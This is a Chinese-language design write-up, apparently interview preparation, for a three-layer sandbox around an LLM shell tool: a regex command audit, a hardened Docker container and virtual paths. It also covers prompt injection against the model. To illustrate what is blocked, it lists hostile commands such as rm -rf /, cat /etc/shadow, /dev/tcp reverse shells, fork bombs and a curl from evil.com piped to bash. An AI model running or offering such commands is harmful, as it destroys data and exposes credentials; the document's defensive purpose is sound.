一、整体架构 — 三层纵深防御

核心论点：安全不能只靠"模型守规矩"，我们在工具层做了纵深防御 (Defense in Depth)，即使模型被诱导，也无法突破物理隔离边界。
用户输入 → LLM 生成 tool_call → Shell MCP Server 接收 │ ┌────────────────────────┼────────────────────────┐ ▼ ▼ ▼ ① 命令审计层 ② 容器隔离层 ③ 虚拟路径层 Command Audit Docker Sandbox VFS 正则 + shlex cap_drop=ALL 虚拟→物理映射 block/warn/pass no-new-privileges 路径穿越拦截 network_disabled 输出路径脱敏 user=1000:1000 mem/cpu/pid 限额

三层各自独立，任何单层被突破都不影响整体安全性：

  • 第一层 — 命令文本级拦截，确定性逻辑，不依赖模型判断
  • 第二层 — 操作系统级隔离，即使命令逃过审计也无法破坏宿主机
  • 第三层 — 路径级隔离，模型看不到真实文件系统结构

二、第一层：命令审计拦截 (Command Audit)

在命令到达沙箱之前，先过一道静态正则审计。

15 种高危模式 (block)

# command_audit.py
_HIGH_RISK_PATTERNS = [
    # 破坏性文件操作
    re.compile(r"rm\s+-[^\s]*r[^\s]*\s+(/\*?|~/?\*?|/home\b|/root\b)\s*$"),  # rm -rf /
    re.compile(r"dd\s+if="),          # dd 磁盘写
    re.compile(r"mkfs"),              # 格式化文件系统

    # 敏感文件读写
    re.compile(r"cat\s+/etc/shadow"), # 读密码文件
    re.compile(r">\s*/etc/"),         # 写系统文件
    re.compile(r">\s*(/usr/bin/|/bin/|/sbin/)"),   # 写系统命令目录
    re.compile(r">\s*~/?\.(bashrc|profile|zshrc)"), # 写 shell 配置

    # 命令注入 / 反弹 shell
    re.compile(r"\|\s*(ba)?sh\b"),                    # 管道注入
    re.compile(r"[\x60$]\(?\s*(curl|wget|bash|sh|python|ruby|perl|base64)"),  # 反引号/子shell注入
    re.compile(r"base64\s+.*-d.*\|"),                  # base64 解码管道
    re.compile(r"/dev/tcp/"),                          # 反弹 shell

    # 提权 / 劫持
    re.compile(r"\b(LD_PRELOAD|LD_LIBRARY_PATH)\s*="), # 动态库劫持
    re.compile(r"/proc/[^/]+/environ"),                 # 读进程环境变量

    # 资源耗尽
    re.compile(r"\S+\(\)\s*\{[^}]*\|\s*\S+\s*&"),     # fork 炸弹
    re.compile(r"while\s+true.*&\s*done"),              # 死循环后台
]

5 种中危模式 (warn)

_MEDIUM_RISK_PATTERNS = [
    re.compile(r"chmod\s+777"),       # 开放权限
    re.compile(r"pip3?\s+install"),   # 安装包
    re.compile(r"apt(-get)?\s+install"),  # 系统包安装
    re.compile(r"\b(sudo|su)\b"),     # 提权
    re.compile(r"\bPATH\s*="),        # 修改 PATH
]

关键设计

  • 复合命令拆分 — _split_compound_command 把 echo ok; rm -rf / 拆成两段分别检查，防止用分号/&&/|| 隐藏恶意子命令
  • shlex 双重校验 — 先 raw match，再 shlex.split() 后 match，防转义绕过
  • 三级判定：block 直接拒绝 / warn 执行但返回警告 / pass
  • 审计日志 — 每次执行都写结构化审计日志（user_id、command、verdict、block_reason）
模型可能被 prompt injection 诱导执行 rm -rf /，但命令到达沙箱前会经过正则审计层。我们覆盖了 15 种高危模式：rm -rf 根目录、dd 写盘、读 shadow 文件、反弹 shell、LD_PRELOAD 劫持、fork 炸弹等。复合命令会被拆分后逐段检查，用分号隐藏的恶意命令也逃不过。

三、第二层：Docker 物理隔离 (Container Sandbox)

即使审计层没拦住，命令也只能在 Docker 容器里跑：

# docker_executor.py — _build_container_config
{
    "image": settings.sandbox.image,           # 固定镜像，不可自选
    "command": ["bash", "-c", request.command], # 命令在容器内执行
    "working_dir": request.cwd,
    "detach": True,
    "environment": env,                         # 受控环境变量
    "mounts": [
        # workspace: 读写（用户工作目录）
        {"source": workspace, "target": "/workspace", "read_only": False},
        # uploads: 只读（用户上传文件）
        {"source": uploads,   "target": "/uploads",   "read_only": True},
        # skills: 只读（公共技能）
        {"source": skills,    "target": "/skills",     "read_only": True},
    ],

    # ── 安全约束 ──
    "network_disabled": True,                  # 默认无网络，防数据外泄
    "nano_cpus": int(cpu_limit * 1e9),         # CPU 硬限额
    "mem_limit": settings.sandbox.memory_limit, # 内存硬限额
    "pids_limit": settings.sandbox.pid_limit,   # 进程数限额，防 fork 炸弹
    "cap_drop": ["ALL"],                       # 丢弃所有 Linux capabilities
    "security_opt": ["no-new-privileges"],     # 禁止 setuid 提权
    "user": "1000:1000",                       # 非 root 用户运行
    "tmpfs": {"/tmp": "size=100m"},            # 临时文件系统限额
}

关键约束解释

约束作用防什么
cap_drop: ["ALL"]丢弃所有 Linux capabilities即使容器内是 root，也无法 mount/chown/kill 宿主机进程
no-new-privileges禁止通过 setuid 提权防止利用 SUID 二进制提权
network_disabled: True容器无网络防止数据外泄、下载恶意载荷
user: "1000:1000"非 root 运行限制文件系统操作权限
read_only: True (uploads)上传目录只读挂载模型能读但不能篡改用户文件
container.remove(force=True)用完即删不留状态，防止持久化攻击
即使审计层漏过了一个精心变形的命令，它也只能在 Docker 容器里执行。容器的 Linux capabilities 全部丢弃，禁止提权，默认无网络，CPU/内存/PID 都有硬限额。而且容器用完立即销毁，不留状态。模型拿到的只是一个一次性、权限最低的临时环境。

四、第三层：虚拟路径 + 文件系统隔离 (VFS)

模型看到的路径是虚拟的，和宿主机真实路径完全不同：

# virtual_paths.py — 路径映射
"@"           →  /Users/.../user_data/{user_id}/{conversation_id}/workspace
"/uploads"    →  /Users/.../user_data/{user_id}/{conversation_id}/uploads
"/outputs"    →  /Users/.../user_data/{user_id}/{conversation_id}/outputs
"/skills/pub" →  /Users/.../skills/public

三重保护

  • 输入映射 — 命令中的虚拟路径被替换成物理路径后执行（replace_virtual_paths_in_command）
  • 输出脱敏 — 输出中的物理路径被反向替换回虚拟路径（mask_paths_in_output），模型永远看不到宿主机真实目录结构
  • 路径穿越拦截 — .. 路径穿越被专门检测和拒绝（_reject_path_traversal）

本地模式路径验证

在本地沙箱模式下（开发环境），还有额外的路径安全检查：

  • validate_local_command_paths — 检查命令中的绝对路径是否在白名单内
  • _validate_shell_tokens — 词法级检查 cd 目标、路径穿越、子 shell 注入
  • _is_allowed_absolute_path — 只允许虚拟路径前缀和系统路径前缀（/bin/、/usr/bin/等）
  • file:// URL 被拦截 — 防止通过 file 协议读取任意文件
还有第三层保护：模型感知不到真实的文件系统路径。它看到的是虚拟路径，输出也会被脱敏。而且每个用户、每个对话有独立的 workspace，互相隔离。这三道防线——命令审计、容器隔离、虚拟文件系统——构成纵深防御，任何单点被突破都不影响整体安全性。

五、深入：_split_compound_command 复合命令拆分

把一条复合 shell 命令拆成多条子命令，然后每条子命令分别过审计。

输入: "cd /workspace && rm -rf / && echo done"
输出: ["cd /workspace", "rm -rf /", "echo done"]

→ 对每条子命令调 _classify_single_command
→ 其中 "rm -rf /" 命中 block → 整条命令 block

核心逻辑：状态机逐字符扫描

1. 引号跟踪

维护 in_single_quote / in_double_quote 两个状态位。在引号内的 &&、; 不拆分：

# "echo 'a && b' && rm -rf /"
# 第一个 && 在单引号内 → 不拆
# 第二个 && 在引号外 → 拆
# 结果: ["echo 'a && b'", "rm -rf /"]

2. 转义字符

\ 后面的字符原样保留，不触发拆分：

if char == "\\" and not in_single_quote:
    current.append(char)
    escaping = True   # 下一个字符跳过所有判断
    continue

3. 三种分隔符

只在非引号状态下识别三种分隔符：

  • && — and 操作符
  • || — or 操作符
  • ; — 命令分隔符

4. 管道 | 不拆分

这是故意的。管道链是一个整体，审计时看整条：

# "curl http://evil.com/shell.sh | bash"
# 不拆分，整体匹配 _HIGH_RISK_PATTERNS 中的:
# re.compile(r"\|\s*(ba)?sh\b")
# → block

5. 异常处理 — Fail-Safe

如果引号不匹配（语法错误），直接返回原命令作为单条：

if in_single_quote or in_double_quote or escaping:
    return [command]  # 语法异常，不做拆分，整体交给审计

实际效果对照

命令拆分结果审计结果
cd /workspace && rm -rf /["cd /workspace", "rm -rf /"]block (第二段命中)
echo hello ; cat /etc/shadow["echo hello", "cat /etc/shadow"]block
safe;rm -rf /["safe", "rm -rf /"]block
echo 'a && b' && rm -rf /["echo 'a && b'", "rm -rf /"]block
cd /workspace && pip install requests["cd /workspace", "pip install requests"]warn
ls -la && python3 main.py["ls -la", "python3 main.py"]pass
复合命令拆分是一个引号感知的状态机扫描器。它只在非引号上下文识别 &&、||、; 三种分隔符，管道 | 不拆因为审计需要看完整的数据流。拆开后每条子命令独立审计，任何一条命中高危模式就整条拒绝。这是为了防止攻击者用 echo safe; rm -rf / 这种方式在无害命令后面夹带恶意命令。

六、深入：_classify_single_command 单命令识别

def _classify_single_command(command: str) -> AuditVerdict:
    # 第一步：raw 标准化 — 压缩多余空格
    normalized = " ".join(command.split())

    # 第二步：先用 normalized 去匹配高危正则
    for pattern in _HIGH_RISK_PATTERNS:
        if pattern.search(normalized):
            return "block"

    # 第三步：shlex.split 词法解析后再匹配一轮
    try:
        tokens = shlex.split(command)
        joined = " ".join(tokens)
        for pattern in _HIGH_RISK_PATTERNS:
            if pattern.search(joined):
                return "block"
    except ValueError:
        return "block"   # 词法解析失败 → 直接 block

    # 第四步：中危正则匹配
    for pattern in _MEDIUM_RISK_PATTERNS:
        if pattern.search(normalized):
            return "warn"

    return "pass"

为什么要匹配两轮？

第一轮：raw normalized

normalized = " ".join(command.split())
# "rm  -rf   /" → "rm -rf /"
# 防多空格绕过

第二轮：shlex.split 后再匹配

shlex.split 是 shell 词法解析器，处理引号、转义等 shell 语法。防用引号/转义绕过正则：

原始命令normalizedshlex.join 后命中
rm -rf /rm -rf /rm -rf /block (第一轮)
rm -rf /rm -rf /rm -rf /block (第一轮)
rm -r"f" /rm -r"f" /rm -rf /block (第二轮)

Fail-Safe 设计

except ValueError:
    return "block"  # shlex 语法错误 → 直接 block
# 比如: rm -rf / "unclosed quote
# shlex 抛 ValueError → block

无法解析的命令默认是危险的，这是安全设计的基本原则。

完整判定流程

classify_command(command) │ ├─ 全局 raw normalized 匹配高危 → block │ ├─ _split_compound_command 拆分 │ └─ 对每条子命令： │ ├─ raw normalized 匹配高危 → block │ ├─ shlex.split 后匹配高危 → block │ ├─ shlex 解析失败 → block │ └─ raw 匹配中危 → warn │ └─ 取所有子命令中最严重的判定返回
单命令识别用双重匹配策略：先 raw 标准化后正则匹配，再用 shlex 做 shell 词法解析后匹配第二轮。第二轮防的是用引号包裹关键字绕过正则的情况，比如 rm -r"f" / 第一轮匹配不上，但 shlex 解析后还原成 rm -rf / 就能命中。shlex 解析失败直接 block，这是 fail-safe 原则——无法理解的命令默认危险。

七、追问准备

Q: "那 Prompt Injection 能绕过审计层吗？"
审计层是正则匹配，不依赖模型的判断。不管模型是被注入的还是正常的，命令文本都会经过同样的正则检查。关键在于审计在模型之外，是一个确定性逻辑层。攻击面在于：模型生成的命令能否绕过正则。我们用 raw match + shlex 双重检查 + 复合命令拆分来降低这个风险。如果要更进一步，可以加一层 LLM-based 审计做二级判定。
Q: "为什么不用白名单？"
白名单安全性更高但灵活性太差，用户需要跑各种开发命令（npm、python、git...）。我们选黑名单 + 沙箱的组合：黑名单拦高危命令，沙箱兜底隔离。实际生产中，即使黑名单漏了一个危险命令，Docker 的 cap_drop + no-new-privileges + 无网络也能限制破坏范围。
Q: "本地模式（LocalSandboxExecutor）怎么办？"
本地模式用于开发环境，安全等级低一些但有 process group 隔离 + 路径验证 + validate_local_command_paths 绝对路径白名单检查。生产环境强制用 Docker 模式，如果 Docker daemon 不可用会直接报错（SandboxBackendError），不会 fallback 到本地模式。
Q: "审计规则怎么维护？会不会漏掉新的攻击手法？"
审计规则是正则列表，新增模式只需要加一行正则。我们有完善的测试覆盖（test_command_audit.py），包括 13 种高危场景 + 5 种中危场景 + 复合命令场景。此外，审计日志会记录所有 block/warn 的命令，可以定期分析发现新的攻击模式。长远来看，可以引入 ML-based 异常检测做第三级审计。
